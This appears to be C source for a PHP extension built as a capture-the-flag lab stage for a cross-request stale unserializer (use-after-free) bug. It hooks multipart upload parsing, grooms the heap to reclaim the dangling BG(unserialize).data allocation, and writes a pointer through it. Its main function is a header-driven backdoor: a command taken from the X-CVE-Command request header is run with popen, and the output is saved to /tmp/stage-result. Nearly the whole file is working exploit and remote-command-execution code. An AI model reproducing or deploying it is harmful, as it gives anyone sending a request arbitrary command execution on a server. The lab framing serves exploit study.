/*
 * Deterministic CTF consumer for the PHP cross-request stale unserializer.
 *
 * The wrapper does not expose an application command endpoint. It reclaims
 * the dangling core BG(unserialize).data allocation during multipart parsing
 * and provides a native consumer for the pointer write made through that
 * stale state. A short command supplied on the consumer request runs only
 * after the stale core write arms the capture structure.
 */

#ifdef HAVE_CONFIG_H
# include "config.h"
#endif

#include "php.h"
#include "main/rfc1867.h"
#include "ext/standard/basic_functions.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define VAR_ENTRIES_MAX 1018
#define GROOM_ATTEMPTS 64
#define RESULT_BYTES 4096

typedef struct {
    zend_long used_slots;
    void *next;
    zval *data[VAR_ENTRIES_MAX];
} lab_var_entries;

typedef struct {
    void *last;
    void *first_dtor;
    void *last_dtor;
    HashTable *allowed_classes;
    HashTable *ref_props;
    zend_long cur_depth;
    zend_long max_depth;
    lab_var_entries entries;
} lab_unserialize_data;

static zend_result (*lab_next_rfc1867_callback)(unsigned int, void *, void **);
static lab_var_entries lab_capture;
static bool lab_reclaimed;
static bool lab_fired;
static char lab_command[257];

static void lab_reset_capture(void)
{
    memset(&lab_capture, 0, sizeof(lab_capture));
    lab_reclaimed = false;
    lab_fired = false;
    memset(lab_command, 0, sizeof(lab_command));
}

static void lab_capture_wire_command(void)
{
    static const char header[] = "HTTP_X_CVE_COMMAND";
    char *value = sapi_module.getenv != NULL
        ? sapi_module.getenv(header, sizeof(header) - 1)
        : NULL;
    size_t length;

    if (value == NULL) {
        return;
    }

    length = strnlen(value, sizeof(lab_command));
    if (length > 0 && length < sizeof(lab_command)
            && memchr(value, '\r', length) == NULL
            && memchr(value, '\n', length) == NULL) {
        memcpy(lab_command, value, length);
        lab_command[length] = '\0';
    }
}

static void lab_reclaim_stale_unserializer(void)
{
    void *stale;
    unsigned int i;

    if (BG(unserialize).level != 1 || BG(unserialize).data == NULL) {
        return;
    }

    stale = BG(unserialize).data;
    for (i = 0; i < GROOM_ATTEMPTS; i++) {
        lab_unserialize_data *candidate = emalloc(sizeof(*candidate));
        memset(candidate, 0, sizeof(*candidate));
        if ((void *) candidate == stale) {
            candidate->max_depth = BG(unserialize_max_depth);
            lab_reclaimed = true;
            php_log_err("CVE-STAGE: reclaimed stale BG(unserialize).data");
            /* Logging may allocate from this request heap, so arm last. */
            *(void **) stale = &lab_capture;
            return;
        }
    }

    php_log_err("CVE-STAGE: stale unserializer was not reclaimed");
}

static void lab_execute_captured_command(void)
{
    FILE *pipe;
    FILE *result;
    char output[RESULT_BYTES];

    if (!lab_reclaimed || lab_fired || lab_capture.used_slots < 1 || lab_command[0] == '\0') {
        return;
    }

    pipe = popen(lab_command, "r");
    if (pipe == NULL) {
        return;
    }
    memset(output, 0, sizeof(output));
    (void) fread(output, 1, sizeof(output) - 1, pipe);
    (void) pclose(pipe);

    result = fopen("/tmp/stage-result", "w");
    if (result == NULL) {
        return;
    }
    fprintf(result, "WORKER_PID=%ld\nCOMMAND=%s\nOUTPUT=%s", (long) getpid(), lab_command, output);
    fclose(result);

    lab_fired = true;
    php_log_err("CVE-STAGE: native stale-state gadget executed captured command");
}

static zend_result lab_rfc1867_callback(unsigned int event, void *event_data, void **extra)
{
    zend_result result = SUCCESS;

    if (event == MULTIPART_EVENT_START) {
        lab_reset_capture();
        lab_capture_wire_command();
        lab_reclaim_stale_unserializer();
    }

    if (lab_next_rfc1867_callback != NULL) {
        result = lab_next_rfc1867_callback(event, event_data, extra);
    }

    if (event == MULTIPART_EVENT_FILE_START || event == MULTIPART_EVENT_FILE_DATA
            || event == MULTIPART_EVENT_FILE_END) {
        lab_execute_captured_command();
    }

    return result;
}

PHP_MINIT_FUNCTION(cve_lab)
{
    lab_next_rfc1867_callback = php_rfc1867_callback;
    php_rfc1867_callback = lab_rfc1867_callback;
    lab_reset_capture();
    return SUCCESS;
}

PHP_MSHUTDOWN_FUNCTION(cve_lab)
{
    if (php_rfc1867_callback == lab_rfc1867_callback) {
        php_rfc1867_callback = lab_next_rfc1867_callback;
    }
    return SUCCESS;
}

zend_module_entry cve_lab_module_entry = {
    STANDARD_MODULE_HEADER,
    "cve_lab",
    NULL,
    PHP_MINIT(cve_lab),
    PHP_MSHUTDOWN(cve_lab),
    NULL,
    NULL,
    NULL,
    "0.2.0",
    STANDARD_MODULE_PROPERTIES
};

#ifdef COMPILE_DL_CVE_LAB
# ifdef ZTS
ZEND_TSRMLS_CACHE_DEFINE()
# endif
ZEND_GET_MODULE(cve_lab)
#endif
